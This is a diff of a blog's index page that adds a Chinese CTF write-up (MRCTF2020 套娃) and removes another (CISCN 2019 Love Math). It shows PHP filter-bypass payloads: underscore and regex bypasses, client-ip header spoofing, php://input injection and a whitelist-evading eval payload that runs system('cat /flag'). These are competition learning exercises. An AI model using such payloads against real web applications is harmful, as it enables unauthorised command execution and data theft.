@@ -71,6 +71,68 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-page-83" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2021/07/29/page-83/" class="article-date">
+  <time class="dt-published" datetime="2021-07-29T06:23:31.000Z" itemprop="datePublished">2021-07-29</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2021/07/29/page-83/">MRCTF2020套娃</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--</span><br><span class="line">//1st</span><br><span class="line">$query = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line"></span><br><span class="line"> if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123;</span><br><span class="line">    die(&#x27;Y0u are So cutE!&#x27;);</span><br><span class="line">&#125;</span><br><span class="line"> if($_GET[&#x27;b_u_p_t&#x27;] !== &#x27;23333&#x27; &amp;&amp; preg_match(&#x27;/^23333$/&#x27;, $_GET[&#x27;b_u_p_t&#x27;]))&#123;</span><br><span class="line">    echo &quot;you are going to the next ~&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>右键查看源码有这么一段<br><strong>substr_count()</strong> 函数极限字串在字符串中出现的次数 有区分大小写<br><strong>%20代替下划线或者%5F 从而绕过第一个if</strong><br>从<strong>get型中取得参数b_u_p_t 不等于23333但是正则匹配需要23333可以使用%0a</strong>(正则匹配</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">中&#x27;^&#x27; 和 &#x27;$&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>代表航道开头和结尾可以利用换行绕过）绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload： b%20u%20p%20t=23333%a 或者b%5Fu%5Fp%5Ft=23333%a</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/97.PNG?raw=true" alt="97.PNG"></p>
+<p>提示这个访问一下右键查看源码<br>一<strong>长串注释是jsfuck的丢控制台</strong></p>
+<p> <img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/99.PNG?raw=true" alt="99.PNG"><br>传入<strong>参数后跳转</strong></p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/98.PNG?raw=true" alt="98.PNG"></p>
+<p>需要ip地址为127.0.0.1 抓包那边填一下client-ip:127.0.0.1</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/100.PNG?raw=true" alt="100.PNG"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">file_get_contents 可用php伪协议</span><br><span class="line">2333=php://input</span><br><span class="line">post: todat is a happy day</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">change函数的作用，传入的参数先进行base64解码，然后将字符转化成ASCII并且+$i*2</span><br></pre></td></tr></table></figure>
+
+<p>反写change函数 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function unchange($v)&#123; </span><br><span class="line">    $re = &#x27;&#x27;;</span><br><span class="line">    for($i=0;$i&lt;strlen($v);$i++)&#123; </span><br><span class="line">        $re .= chr ( ord ($v[$i]) - $i*2 ); </span><br><span class="line">    &#125; </span><br><span class="line">    return $re; </span><br><span class="line">&#125;</span><br><span class="line">$real_flag = unchange(&#x27;flag.php&#x27;);</span><br><span class="line">echo base64_encode($real_flag);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>得到这串ZmpdYSZmXGI=</p>
+<p>抓包改包ok</p>
+<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/101.PNG?raw=true" alt="101.PNG"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2021/07/29/page-83/" data-id="cksyl7wk10020w4w7femvd4n6" data-title="MRCTF2020套娃" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-page-82" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2021/07/29/page-82/" class="article-date">
@@ -602,53 +664,6 @@ POST：_SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
 
 
   
-    <article id="post-page-72" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2021/07/13/page-72/" class="article-date">
-  <time class="dt-published" datetime="2021-07-13T08:58:47.000Z" itemprop="datePublished">2021-07-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2021/07/13/page-72/">CISCN 2019 初赛Love Math</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>过滤了一些字符也给了一些白名单<br> &lt;?php<br>error_reporting(0);<br>//听说你很喜欢数学，不知道你是否爱它胜过爱flag<br>if(!isset($_GET[‘c’])){<br>    show_source(__ FILE__);<br>}else{<br>    //例子 c=20-1<br>    $content = $_GET[‘c’];<br>    if (strlen($content) &gt;= 80) {<br>        die(“太长了不会算”);<br>    }<br>    $blacklist = [‘ ‘, ‘\t’, ‘\r’, ‘\n’,’&#39;‘, ‘“‘, ‘`’, ‘[‘, ‘]‘];<br>    foreach ($blacklist as $blackitem) {<br>        if (preg_match(‘/‘ . $blackitem . ‘/m’, $content)) {<br>            die(“请不要输入奇奇怪怪的字符”);<br>        }<br>    }<br>    //常用数学函数<a target="_blank" rel="noopener" href="http://www.w3school.com.cn/php/php_ref_math.asp">http://www.w3school.com.cn/php/php_ref_math.asp</a><br>    $whitelist = [‘abs’, ‘acos’, ‘acosh’, ‘asin’, ‘asinh’, ‘atan2’, ‘atan’, ‘atanh’, ‘base_convert’, ‘bindec’, ‘ceil’, ‘cos’, ‘cosh’, ‘decbin’, ‘dechex’, ‘decoct’, ‘deg2rad’, ‘exp’, ‘expm1’, ‘floor’, ‘fmod’, ‘getrandmax’, ‘hexdec’, ‘hypot’, ‘is_finite’, ‘is_infinite’, ‘is_nan’, ‘lcg_value’, ‘log10’, ‘log1p’, ‘log’, ‘max’, ‘min’, ‘mt_getrandmax’, ‘mt_rand’, ‘mt_srand’, ‘octdec’, ‘pi’, ‘pow’, ‘rad2deg’, ‘rand’, ‘round’, ‘sin’, ‘sinh’, ‘sqrt’, ‘srand’, ‘tan’, ‘tanh’];<br>    preg_match_all(‘/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/‘, $content, $used_funcs);<br>    foreach ($used_funcs[0] as $func) {<br>        if (!in_array($func, $whitelist)) {<br>            die(“请不要输入奇奇怪怪的函数”);<br>        }<br>    }<br>    //帮你算出答案<br>    eval(‘echo ‘.$content.’;’);<br>}<br><strong>白名单里面有一些可以使用base_convert()函数再任意进制见转换数字</strong><br><strong>base_convert(a,b,c）  a:必需，原始值 b:必须，数字原来的进制；c: 必须，要转换的进制。</strong><br><strong>hex2bin() 函数  将ascii码转成十六进制  dechex() 将十进制转换成十六进制</strong><br><strong>目标payload：</strong> ?c=system9”cat/flag”)  ;没有引号也可执行命令</p>
-<p>采用变量保存函数和参数</p>
-<p><strong>?c=($_GET[a])($_GET[b])&amp;a=system&amp;b=cat/flag</strong><br>用whitelist内的函数替代<br>?c=($_GET[pi])($_GET[cos])&amp;pi=system&amp;cos=cat/flag<br>但是呢_GET不是白名单内的变量 [] 也被过滤了<br>[] 可以用{}替代<br>_GET 就得用hex2bin() 来转换</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/15.PNG?raw=true" alt="15.PNG"></p>
-<p>_GET -&gt; hex2bin(5f 47 45 54)<br>hex2bin这个也得转 发现hex2bin的36进制一摸一样 那就把36转10<br>hex2bin-&gt;base_convert(37907361743,10,36)</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/15.PNG?raw=true" alt="15.PNG"></p>
-<p>然后5f474554 还得转进制不然也会被过滤 1598506324</p>
-<p>5f474554-&gt;dechex(1598506324)<br>_GET=hex2bin(5f 47 45 54)=base_convert(37907361743,10,36)(dechex(1598506324))<br>_GET得存进一个变量里面<br>$pi=base_convert(37907361743,10,36)(dechex(1598506324));<br>最终payload：  c=$pi=base_convert(37907361743,10,36)(dechex(1598506324));($$pi){pi}(($$pi){abs})&amp;pi=system&amp;abs=cat /flag</p>
-<p><img src="https://github.com/ajin-max/ajin-max.github.io/blob/master/img/17.PNG?raw=true" alt="17.PNG"></p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2021/07/13/page-72/" data-id="cksyl7wjx001qw4w782jk5ym6" data-title="CISCN 2019 初赛Love Math" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -685,6 +700,10 @@ POST：_SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
       <ul>
         
           <li>
+            <a href="/2021/09/19/page-116/">第五空间WEBFTP pklovecloud</a>
+          </li>
+        
+          <li>
             <a href="/2021/09/09/page-115/">又是misc</a>
           </li>
         
@@ -698,10 +717,6 @@ POST：_SESSION[flagflag]=";s:3:"aaa";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";}
         
           <li>
             <a href="/2021/08/13/page-109/">网鼎杯 2020 白虎组PicDown</a>
-          </li>
-        
-          <li>
-            <a href="/2021/08/13/page-108/">b01lers2020Welcome to Earth</a>
           </li>
         
       </ul>
